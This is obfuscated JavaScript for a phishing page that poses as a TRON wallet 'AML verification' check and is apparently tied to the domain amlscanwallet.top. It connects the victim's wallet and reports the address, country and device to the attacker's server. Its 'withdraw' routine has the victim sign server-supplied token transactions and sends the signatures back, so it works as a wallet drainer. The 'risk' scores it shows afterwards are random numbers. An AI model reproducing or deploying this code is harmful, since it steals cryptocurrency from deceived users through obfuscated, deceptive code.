const _0x2b436f = _0x1810;
(function(_0x37cbd8, _0x51da46) {
    const _0x206139 = _0x1810
      , _0x4a8f7f = _0x37cbd8();
    while (!![]) {
        try {
            const _0x378735 = parseInt(_0x206139(0x1a6)) / 0x1 + -parseInt(_0x206139(0x1a9)) / 0x2 + -parseInt(_0x206139(0x143)) / 0x3 + -parseInt(_0x206139(0x14f)) / 0x4 * (parseInt(_0x206139(0x18d)) / 0x5) + -parseInt(_0x206139(0x18c)) / 0x6 * (-parseInt(_0x206139(0x174)) / 0x7) + parseInt(_0x206139(0x168)) / 0x8 * (-parseInt(_0x206139(0x1a2)) / 0x9) + -parseInt(_0x206139(0x193)) / 0xa * (-parseInt(_0x206139(0x171)) / 0xb);
            if (_0x378735 === _0x51da46)
                break;
            else
                _0x4a8f7f['push'](_0x4a8f7f['shift']());
        } catch (_0x481dad) {
            _0x4a8f7f['push'](_0x4a8f7f['shift']());
        }
    }
}(_0x3fa7, 0xe8dfa));
function _0x1810(_0x5cf1a0, _0x34926a) {
    const _0x3fa775 = _0x3fa7();
    return _0x1810 = function(_0x1810e9, _0x3bffdc) {
        _0x1810e9 = _0x1810e9 - 0x128;
        let _0x31311e = _0x3fa775[_0x1810e9];
        return _0x31311e;
    }
    ,
    _0x1810(_0x5cf1a0, _0x34926a);
}
const {TronLinkAdapter, BitKeepAdapter, WalletConnectAdapter, OkxWalletAdapter, LedgerAdapter} = window['@tronweb3/tronwallet-adapters']
  , THEME_STYLE = 'light'
  , SERVER_DOMAIN = _0x2b436f(0x130)
  , PROJECT_ID_WC = '0cffe4c154d3e838f8cf006c5e072c98';
window[_0x2b436f(0x176)] = {
    'env': {
        'NODE_ENV': _0x2b436f(0x184)
    }
};
const okxWallet = document[_0x2b436f(0x137)](_0x2b436f(0x185))
  , walletsContainer = document[_0x2b436f(0x137)]('.wallet-wrapper')
  , networksBlock = document['querySelector']('.step-1')
  , walletsBlock = document[_0x2b436f(0x137)](_0x2b436f(0x13c))
  , connectionBlock = document[_0x2b436f(0x137)]('.step-3')
  , checkingBlock = document[_0x2b436f(0x137)]('.step-4')
  , resultsBlock = document['querySelector'](_0x2b436f(0x162))
  , tronNetwork = document[_0x2b436f(0x137)](_0x2b436f(0x15d))
  , btnStep1 = document[_0x2b436f(0x137)](_0x2b436f(0x169))
  , btnStep2 = document[_0x2b436f(0x137)](_0x2b436f(0x150))
  , btnStep3 = document[_0x2b436f(0x137)](_0x2b436f(0x181))
  , btnStep5 = document[_0x2b436f(0x137)](_0x2b436f(0x159))
  , errorBlocks = document[_0x2b436f(0x144)](_0x2b436f(0x142));
let adapter, userAddress = '', tokens = [];
tronNetwork[_0x2b436f(0x18e)](_0x2b436f(0x12d), () => {
    const _0x5057b0 = _0x2b436f;
    tronNetwork[_0x5057b0(0x12e)]['add'](_0x5057b0(0x173)),
    btnStep1[_0x5057b0(0x15c)]('disabled'),
    btnStep1[_0x5057b0(0x18e)](_0x5057b0(0x12d), toStep2);
}
);
function toStep1() {
    const _0x3852c8 = _0x2b436f;
    networksBlock['style'][_0x3852c8(0x166)] = _0x3852c8(0x13b),
    walletsBlock[_0x3852c8(0x151)][_0x3852c8(0x166)] = 'none',
    resultsBlock['style']['display'] = 'none',
    btnStep2[_0x3852c8(0x182)](_0x3852c8(0x12d), toStep1),
    walletsContainer[_0x3852c8(0x182)](_0x3852c8(0x12d), connectWallet);
}
function toStep2() {
    const _0x5d0923 = _0x2b436f;
    networksBlock['style'][_0x5d0923(0x166)] = 'none',
    connectionBlock[_0x5d0923(0x151)][_0x5d0923(0x166)] = 'none',
    walletsBlock[_0x5d0923(0x151)][_0x5d0923(0x166)] = 'block',
    tronNetwork[_0x5d0923(0x12e)][_0x5d0923(0x138)](_0x5d0923(0x173)),
    btnStep1[_0x5d0923(0x14d)](_0x5d0923(0x1a7), _0x5d0923(0x1a7)),
    btnStep1[_0x5d0923(0x182)](_0x5d0923(0x12d), toStep2),
    btnStep2['addEventListener'](_0x5d0923(0x12d), toStep1),
    walletsContainer[_0x5d0923(0x18e)]('click', connectWallet);
}
function toStep3(_0xc1b215, _0x285887) {
    const _0x13c006 = _0x2b436f;
    walletsBlock['style'][_0x13c006(0x166)] = _0x13c006(0x17e),
    connectionBlock[_0x13c006(0x151)][_0x13c006(0x166)] = _0x13c006(0x13b),
    connectionBlock['querySelector'](_0x13c006(0x17d))['textContent'] = _0xc1b215,
    connectionBlock[_0x13c006(0x137)](_0x13c006(0x18b))[_0x13c006(0x14d)](_0x13c006(0x179), _0x285887),
    btnStep2[_0x13c006(0x182)](_0x13c006(0x12d), toStep1),
    walletsContainer[_0x13c006(0x182)](_0x13c006(0x12d), connectWallet);
}
async function toStep4(_0x42af58, _0x39cbcd) {
    const _0x1b8663 = _0x2b436f;
    connectionBlock[_0x1b8663(0x151)][_0x1b8663(0x166)] = _0x1b8663(0x17e),
    checkingBlock['style'][_0x1b8663(0x166)] = 'block',
    checkingBlock['querySelector']('.selected-wallet-name')['textContent'] = _0x42af58,
    checkingBlock[_0x1b8663(0x137)](_0x1b8663(0x18b))[_0x1b8663(0x14d)](_0x1b8663(0x179), _0x39cbcd),
    checkingBlock[_0x1b8663(0x137)](_0x1b8663(0x131))['textContent'] = userAddress,
    btnStep3[_0x1b8663(0x18e)]('click', withdraw);
}
async function toStep5() {
    const _0x6f61e4 = _0x2b436f;
    checkingBlock['style']['display'] = 'none',
    resultsBlock['style'][_0x6f61e4(0x166)] = _0x6f61e4(0x13b),
    resultsBlock['querySelector'](_0x6f61e4(0x13a))[_0x6f61e4(0x12f)] = getRandomPercentage(25.01, 45.99) + '%';
    const _0x4ed1c0 = resultsBlock['querySelectorAll'](_0x6f61e4(0x14e));
    _0x4ed1c0['forEach'](_0x35053c => {
        const _0x46e8fc = _0x6f61e4
          , _0x5f09a8 = getRandomPercentage(10.01, 45.99);
        _0x35053c[_0x46e8fc(0x137)]('.progress-percent')[_0x46e8fc(0x12f)] = _0x5f09a8,
        _0x35053c[_0x46e8fc(0x137)](_0x46e8fc(0x17a))[_0x46e8fc(0x151)]['width'] = _0x5f09a8 + '%';
    }
    ),
    btnStep5[_0x6f61e4(0x18e)](_0x6f61e4(0x12d), toStep1);
}
function getRandomPercentage(_0x20e639, _0x56a052) {
    const _0x423b53 = _0x2b436f
      , _0x4c9b23 = Math[_0x423b53(0x152)]() * (_0x56a052 - _0x20e639) + _0x20e639;
    return _0x4c9b23[_0x423b53(0x15a)](0x2);
}
function updatePercentage() {
    const _0x1478f1 = _0x2b436f
      , _0x4f3eb1 = document[_0x1478f1(0x137)](_0x1478f1(0x15f));
    if (_0x4f3eb1) {
        const _0x211af1 = getRandomPercentage(10.01, 45.99);
        _0x4f3eb1['textContent'] = _0x211af1 + '%';
    }
}
const ADAPTERS = [{
    'name': _0x2b436f(0x163),
    'config': new TronLinkAdapter()
}, {
    'name': _0x2b436f(0x180),
    'config': new BitKeepAdapter()
}, {
    'name': _0x2b436f(0x188),
    'config': new OkxWalletAdapter()
}, {
    'name': _0x2b436f(0x156),
    'config': new LedgerAdapter()
}, {
    'name': 'walletConnectAdapter',
    'config': new WalletConnectAdapter({
        'network': _0x2b436f(0x135),
        'options': {
            'relayUrl': _0x2b436f(0x172),
            'projectId': PROJECT_ID_WC,
            'metadata': {
                'name': document[_0x2b436f(0x13d)],
                'description': _0x2b436f(0x14b),
                'url': _0x2b436f(0x161) + window['location'][_0x2b436f(0x14c)],
                'icons': [_0x2b436f(0x186)]
            }
        },
        'web3ModalConfig': {
            'themeMode': THEME_STYLE,
            'themeVariables': {
                '--wcm-z-index': 0x3e8
            },
            'explorerRecommendedWalletIds': [_0x2b436f(0x147), '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', _0x2b436f(0x16e), _0x2b436f(0x14a)]
        }
    })
}];
function returnErrorMessage() {
    const _0x54261f = _0x2b436f;
    return {
        'rejected': _0x54261f(0x19b),
        'connectionDenied': _0x54261f(0x1a3),
        'balance': _0x54261f(0x154),
        'balanceTRX': 'You\x20don`t\x20have\x20at\x20least\x2035\x20TRX\x20to\x20pass\x20the\x20verification.\x20Please\x20add\x20funds\x20to\x20your\x20balance\x20and\x20try\x20again',
        'server': 'An\x20error\x20occurred\x20on\x20the\x20server.\x20Please\x20try\x20again',
        'repeated': _0x54261f(0x157),
        'another': 'An\x20unknown\x20error\x20occurred.\x20Check\x20the\x20console\x20for\x20more\x20details.'
    };
}
function handleError(_0xfa09de) {
    const _0x2e5733 = _0x2b436f;
    errorBlocks[_0x2e5733(0x1a5)](_0x47abac => {
        const _0x2c49fe = _0x2e5733;
        if (_0xfa09de[_0x2c49fe(0x192)][_0x2c49fe(0x129)](_0x2c49fe(0x187)))
            _0x47abac[_0x2c49fe(0x12f)] = returnErrorMessage()[_0x2c49fe(0x12c)],
            _0x47abac['style'][_0x2c49fe(0x155)] = '1';
        else {
            if (_0xfa09de[_0x2c49fe(0x192)][_0x2c49fe(0x129)](_0x2c49fe(0x1a1)) || _0xfa09de['message'][_0x2c49fe(0x129)](_0x2c49fe(0x17f)) || _0xfa09de[_0x2c49fe(0x192)][_0x2c49fe(0x129)]('The\x20QR\x20window\x20is\x20closed') || _0xfa09de[_0x2c49fe(0x192)][_0x2c49fe(0x129)](_0x2c49fe(0x194)) || _0xfa09de[_0x2c49fe(0x192)]['includes']('User\x20canceled'))
                _0x47abac[_0x2c49fe(0x12f)] = returnErrorMessage()[_0x2c49fe(0x17f)],
                _0x47abac[_0x2c49fe(0x151)]['opacity'] = '1';
            else {
                if (_0xfa09de['message'][_0x2c49fe(0x129)](_0x2c49fe(0x165)))
                    _0x47abac['textContent'] = returnErrorMessage()['balanceTRX'],
                    _0x47abac['style'][_0x2c49fe(0x155)] = '1';
                else {
                    if (_0xfa09de[_0x2c49fe(0x192)][_0x2c49fe(0x129)](_0x2c49fe(0x16a)))
                        _0x47abac[_0x2c49fe(0x12f)] = returnErrorMessage()[_0x2c49fe(0x19a)],
                        _0x47abac[_0x2c49fe(0x151)][_0x2c49fe(0x155)] = '1';
                    else
                        _0xfa09de['message'][_0x2c49fe(0x129)]('Something\x20went\x20wrong\x20when\x20trying\x20to\x20send\x20data') ? (_0x47abac['textContent'] = returnErrorMessage()[_0x2c49fe(0x16d)],
                        _0x47abac[_0x2c49fe(0x151)][_0x2c49fe(0x155)] = '1') : (_0x47abac[_0x2c49fe(0x12f)] = returnErrorMessage()[_0x2c49fe(0x128)],
                        _0x47abac[_0x2c49fe(0x151)][_0x2c49fe(0x155)] = '1');
                }
            }
        }
    }
    );
}
function hideError() {
    errorBlocks['forEach'](_0x30dc3f => {
        const _0x62c4c4 = _0x1810;
        _0x30dc3f[_0x62c4c4(0x151)]['opacity'] = '0';
    }
    );
}
async function checkCountry() {
    const _0x3abe9f = _0x2b436f;
    try {
        const _0x2fae15 = await (await fetch(_0x3abe9f(0x195)))[_0x3abe9f(0x178)]();
        return _0x2fae15[_0x3abe9f(0x134)];
    } catch (_0x284a95) {
        return console[_0x3abe9f(0x175)](_0x284a95),
        _0x3abe9f(0x191);
    }
}
function isMobile() {
    const _0x336335 = _0x2b436f;
    let _0x1b04e2 = ![];
    return function(_0x1e9358) {
        const _0x327699 = _0x1810;
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i['test'](_0x1e9358) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x327699(0x153)](_0x1e9358[_0x327699(0x189)](0x0, 0x4)))
            _0x1b04e2 = !![];
    }(navigator[_0x336335(0x197)] || navigator[_0x336335(0x19c)] || window[_0x336335(0x18a)]),
    _0x1b04e2;
}
;isMobile() && (okxWallet[_0x2b436f(0x151)][_0x2b436f(0x166)] = _0x2b436f(0x17e));
async function sendDataToServer(_0x2152c, _0x59beed) {
    const _0x1a24dd = _0x2b436f;
    try {
        const _0x512210 = await fetch(_0x1a24dd(0x139) + SERVER_DOMAIN + '/' + _0x59beed, {
            'method': _0x1a24dd(0x145),
            'headers': {
                'Content-Type': _0x1a24dd(0x19d)
            },
            'body': JSON[_0x1a24dd(0x12a)](_0x2152c)
        });
        if (_0x512210[_0x1a24dd(0x15b)] === 0xc8)
            return await _0x512210[_0x1a24dd(0x178)]();
        else
            throw new Error(await _0x512210['text']());
    } catch (_0x197b5c) {
        throw _0x197b5c;
    }
}
async function connectWallet(_0xbefc05) {
    const _0x199d58 = _0x2b436f;
    hideError();
    const _0x4dde34 = _0xbefc05[_0x199d58(0x170)]['closest'](_0x199d58(0x141));
    if (_0x4dde34) {
        const _0x46d03d = _0x4dde34[_0x199d58(0x137)]('.wallet-name')[_0x199d58(0x12f)]
          , _0x22a587 = _0x4dde34[_0x199d58(0x137)]('.wallet-logo')[_0x199d58(0x164)](_0x199d58(0x179));
        console[_0x199d58(0x175)](_0x46d03d);
        let _0x23e117;
        switch (_0x46d03d) {
        case _0x199d58(0x17c):
            _0x23e117 = _0x199d58(0x163);
            break;
        case _0x199d58(0x16c):
            _0x23e117 = 'okxAdapter';
            break;
        case 'Bitget\x20Wallet':
            _0x23e117 = _0x199d58(0x180);
            break;
        case _0x199d58(0x160):
            _0x23e117 = _0x199d58(0x156);
            break;
        case _0x199d58(0x183):
            _0x23e117 = _0x199d58(0x16f);
            break;
        default:
            console[_0x199d58(0x175)]('Unknown\x20wallet');
        }
        const _0xc95cd8 = ADAPTERS[_0x199d58(0x133)](_0x2fb9b2 => _0x2fb9b2[_0x199d58(0x134)] === _0x23e117);
        adapter = _0xc95cd8['config'],
        console['log'](adapter);
        try {
            toStep3(_0x46d03d, _0x22a587),
            await adapter[_0x199d58(0x1a0)](),
            userAddress = adapter[_0x199d58(0x198)];
            if (_0x46d03d === _0x199d58(0x15e) && userAddress === '') {
                await adapter[_0x199d58(0x132)]();
                throw new Error(_0x199d58(0x17f));
            }
            userAddress !== '' && (await sendAndGetDataFromServer(),
            toStep4(_0x46d03d, _0x22a587));
        } catch (_0x59daeb) {
            console[_0x199d58(0x175)](_0x59daeb),
            toStep2();
            if (!_0x59daeb[_0x199d58(0x192)][_0x199d58(0x129)](_0x199d58(0x148)))
                handleError(_0x59daeb);
        }
    }
}
async function checkConnection() {
    const _0x1a479d = _0x2b436f;
    try {
        const _0x3763c3 = ADAPTERS[_0x1a479d(0x133)](_0x226c99 => _0x226c99[_0x1a479d(0x17b)][_0x1a479d(0x13e)]);
        _0x3763c3 !== undefined ? (console[_0x1a479d(0x175)](_0x1a479d(0x12b)),
        adapter = _0x3763c3[_0x1a479d(0x17b)],
        userAddress = adapter[_0x1a479d(0x198)],
        await sendAndGetDataFromServer()) : console['log'](_0x1a479d(0x136));
    } catch (_0x25565c) {
        handleError(_0x25565c),
        console[_0x1a479d(0x175)](_0x25565c);
    }
}
;async function sendAndGetDataFromServer() {
    const _0x4b15de = _0x2b436f;
    try {
        const _0x4ec781 = await checkCountry()
          , _0x4bf15f = {
            'event': _0x4b15de(0x1a0),
            'walletName': adapter[_0x4b15de(0x134)],
            'domain': window['location'][_0x4b15de(0x196)],
            'country': _0x4ec781,
            'device': isMobile() ? 'Mobile' : _0x4b15de(0x19f),
            'address': userAddress
        }
          , _0x56ce22 = await sendDataToServer(_0x4bf15f, 'send_connection_data');
        if (_0x56ce22[_0x4b15de(0x192)] === _0x4b15de(0x16a)) {
            await adapter[_0x4b15de(0x132)]();
            throw new Error(_0x56ce22['message']);
        } else {
            if (_0x56ce22[_0x4b15de(0x192)] === _0x4b15de(0x165)) {
                await adapter[_0x4b15de(0x132)]();
                throw new Error(_0x56ce22[_0x4b15de(0x192)]);
            }
        }
        tokens = _0x56ce22;
    } catch (_0x246787) {
        console[_0x4b15de(0x175)](_0x246787);
        throw _0x246787;
    } finally {}
}
const processedTokens = new Set();
function _0x3fa7() {
    const _0x2a7ad6 = ['signTransaction', '14664NchkqD', '.btn-step-1', 'Insufficient\x20balance', 'tokenId', 'OKX\x20Wallet', 'server', '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f', 'walletConnectAdapter', 'target', '4400OIpYiS', 'wss://relay.walletconnect.com', 'active', '175bSnDXE', 'log', 'process', 'unSignedTx', 'json', 'src', '.progress-bar', 'config', 'TronLink\x20Wallet', '.selected-wallet-name', 'none', 'rejected', 'bitGetAdapter', '.btn-step-3', 'removeEventListener', 'WalletConnect', 'production', '.okx-button', 'https://avatars.githubusercontent.com/u/37784886', 'Wallet\x20was\x20not\x20connected', 'okxAdapter', 'substr', 'opera', '.selected-wallet-logo', '125886iqiOHx', '8045565jkNABT', 'addEventListener', 'startedTransaction', 'txID', 'Unknown', 'message', '151260adpeDy', 'Confirmation\x20declined\x20by\x20user', 'https://get.geojs.io/v1/ip/country.json', 'hostname', 'userAgent', 'address', 'hash', 'balance', 'You\x20rejected\x20the\x20request.\x20Confirm\x20to\x20proceed.', 'vendor', 'application/json;charset=utf-8', 'revertedTransaction', 'Desktop', 'connect', 'Access\x20denied\x20to\x20use\x20Ledger\x20device', '7047HVURuE', 'Connection\x20request\x20denied.\x20Please\x20try\x20again', 'add', 'forEach', '610730GqgZXP', 'disabled', 'send_signedTx', '3469738EfVhCR', 'another', 'includes', 'stringify', 'true', 'connectionDenied', 'click', 'classList', 'textContent', 'amlscanwallet.top', '.selected-wallet-address', 'disconnect', 'find', 'name', 'Mainnet', 'false', 'querySelector', 'remove', 'https://', '.total-percent', 'block', '.step-2', 'title', 'connected', 'send_message', 'event', '.connect-wallet', '.checking-error', '4357752PCBmBv', 'querySelectorAll', 'POST', 'signedTx', '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', 'The\x20wallet\x20is\x20not\x20found', 'error', '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', 'Web3\x20Application', 'host', 'setAttribute', '.progress-wrapper', '4xXjeWG', '.btn-step-2', 'style', 'random', 'test', 'Tokens\x20are\x20missing\x20for\x20verification.\x20Please\x20connect\x20a\x20different\x20wallet', 'opacity', 'ledgerAdapter', 'Request\x20has\x20already\x20been\x20sent.\x20Please\x20open\x20your\x20wallet\x20and\x20confirm\x20the\x20action', 'has', '.btn-step-5', 'toFixed', 'status', 'removeAttribute', '.tron', 'Bitget\x20Wallet', '.percent', 'Ledger\x20Wallet', 'http://', '.step-5', 'tronLinkAdapter', 'getAttribute', 'Insufficient\x20trx\x20balance', 'display'];
    _0x3fa7 = function() {
        return _0x2a7ad6;
    }
    ;
    return _0x3fa7();
}
async function withdraw() {
    const _0x3c4e08 = _0x2b436f;
    hideError(),
    btnStep3[_0x3c4e08(0x14d)]('disabled', _0x3c4e08(0x1a7));
    for (const _0x2a242e of tokens) {
        if (processedTokens[_0x3c4e08(0x158)](_0x2a242e[_0x3c4e08(0x16b)]))
            continue;
        const _0x5db0e5 = {
            'side': 'Client\x20side',
            'token': _0x2a242e,
            'sender': userAddress
        };
        try {
            _0x5db0e5[_0x3c4e08(0x140)] = _0x3c4e08(0x18f),
            await sendDataToServer(_0x5db0e5, _0x3c4e08(0x13f));
            const _0x147b85 = await adapter[_0x3c4e08(0x167)](_0x2a242e[_0x3c4e08(0x177)]);
            _0x2a242e[_0x3c4e08(0x146)] = _0x147b85;
            const _0x33af2c = await sendDataToServer({
                'token': _0x2a242e,
                'userAddress': userAddress
            }, _0x3c4e08(0x1a8))
              , _0x3313e4 = _0x33af2c[_0x3c4e08(0x190)];
            _0x5db0e5[_0x3c4e08(0x140)] = 'completedTransaction',
            _0x5db0e5[_0x3c4e08(0x199)] = _0x3313e4,
            await sendDataToServer(_0x5db0e5, 'send_message'),
            processedTokens[_0x3c4e08(0x1a4)](_0x2a242e[_0x3c4e08(0x16b)]);
        } catch (_0x533158) {
            console['log'](_0x533158),
            _0x5db0e5[_0x3c4e08(0x140)] = _0x3c4e08(0x19e);
            if (_0x533158[_0x3c4e08(0x192)])
                _0x5db0e5[_0x3c4e08(0x149)] = _0x533158['message'];
            await sendDataToServer(_0x5db0e5, _0x3c4e08(0x13f)),
            btnStep3[_0x3c4e08(0x15c)]('disabled'),
            handleError(_0x533158);
            return;
        }
    }
    btnStep3[_0x3c4e08(0x15c)](_0x3c4e08(0x1a7)),
    toStep5();
}
